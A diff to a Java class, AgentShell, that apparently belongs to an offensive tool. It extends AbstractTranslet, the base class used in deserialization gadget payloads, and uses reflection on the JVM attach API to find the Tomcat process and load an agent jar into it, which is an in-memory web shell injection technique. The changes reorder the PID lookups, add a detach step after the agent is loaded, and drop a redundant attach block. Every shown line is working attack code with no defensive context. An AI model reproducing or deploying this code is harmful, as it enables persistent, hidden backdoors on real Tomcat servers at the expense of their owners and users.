@@ -37,9 +37,9 @@ public class AgentShell extends AbstractTranslet {
             Method attachMethod = VirtualMachineCls.getDeclaredMethod("attach", new Class[]{String.class});
             Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod("loadAgent", new Class[]{String.class});
 
-            String pid = AgentShell.getTomcatPid();
+            String pid = AgentShell.getTomcatPid2();
             if(pid == null){
-                pid = AgentShell.getTomcatPid2();
+                pid = AgentShell.getTomcatPid();
             }
             if (pid != null){
                 vm = attachMethod.invoke(null, pid);
@@ -50,15 +50,13 @@ public class AgentShell extends AbstractTranslet {
                     try {
                         vm = attachMethod.invoke(null, id);
                         loadAgentMethod.invoke(vm,AgentShell.jarPath);
+                        Method detachMethod = VirtualMachineCls.getDeclaredMethod("detach", null);
+                        detachMethod.invoke(vm,null);
                     }catch (Exception e){
                         e.printStackTrace();
                     }
                 }
             }
-
-            vm = attachMethod.invoke(null, AgentShell.getTomcatPid());
-            loadAgentMethod.invoke(vm,AgentShell.jarPath);
-
         }catch (Exception e){
             e.printStackTrace();
         }finally {
